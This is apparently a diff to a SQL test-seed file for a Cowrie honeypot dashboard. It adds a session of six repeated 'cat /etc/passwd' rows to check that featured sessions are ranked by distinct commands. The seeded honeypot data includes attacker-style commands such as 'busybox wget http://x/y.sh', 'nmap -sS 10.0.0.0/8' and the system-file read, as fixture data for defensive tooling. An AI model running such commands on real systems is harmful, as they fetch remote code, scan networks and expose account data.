@@ -25,7 +25,9 @@
 
 BEGIN;
 
--- 12 events, 4 distinct source IPs, 3 ASNs, 3 countries, 3 sessions.
+-- 19 events, 5 distinct source IPs, 4 ASNs, 4 countries, 4 sessions.
+-- s004 sits on its own ASN/country so it cannot disturb the leaderboard
+-- assertions, which exist to check ordering rather than these totals.
 INSERT INTO cowrie_events
   ("timestamp", src_ip, dest_port, username, password, command, session_id, country_iso, asn, org, city)
 VALUES
@@ -48,7 +50,20 @@ VALUES
   -- Sessionless events — the schema allows NULL session_id, so /sessions must
   -- not choke on them and /latest must still list them.
   (now() - interval '15 min', '10.20.30.40', 22, 'user', 'pass', NULL,                         NULL,   'DE', 3320,  'Deutsche Telekom', 'Berlin'),
-  (now() - interval '14 min', '10.20.30.40', 22, NULL,   NULL,   'echo hello',                 NULL,   'DE', 3320,  'Deutsche Telekom', 'Berlin');
+  (now() - interval '14 min', '10.20.30.40', 22, NULL,   NULL,   'echo hello',                 NULL,   'DE', 3320,  'Deutsche Telekom', 'Berlin'),
+
+  -- Session s004 — six command rows, but all the SAME command. Some older
+  -- sessions were ingested more than once, so this shape exists in production
+  -- (one 2026-08-09 session holds twelve exact copies of every event).
+  -- /sessions/featured must rank by DISTINCT commands: by raw count s004 (6)
+  -- beats s001 (4) and the front page would replay one line six times over.
+  (now() - interval '20 min', '203.0.113.9', 22, 'root', 'toor',  NULL,             's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
+  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
+  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
+  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
+  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
+  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
+  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo');
 
 -- cowrie_unique_commands is maintained by the ingest endpoint, not by a
 -- trigger, so it has to be seeded alongside. Mirrors the commands above.
@@ -61,7 +76,8 @@ VALUES
   ('rm -rf /tmp/bins.sh',         now() - interval '56 min', now() - interval '56 min', 3, 1),
   ('busybox wget http://x/y.sh',  now() - interval '43 min', now() - interval '43 min', 2, 1),
   ('nmap -sS 10.0.0.0/8',         now() - interval '29 min', now() - interval '29 min', 1, 1),
-  ('echo hello',                  now() - interval '14 min', now() - interval '14 min', 1, 1)
+  ('echo hello',                  now() - interval '14 min', now() - interval '14 min', 1, 1),
+  ('cat /etc/passwd',             now() - interval '19 min', now() - interval '19 min', 6, 1)
 ON CONFLICT (command) DO NOTHING;
 
 -- Malware samples. Fires trg_sync_cowrie_files_agg -> cowrie_files_agg, and
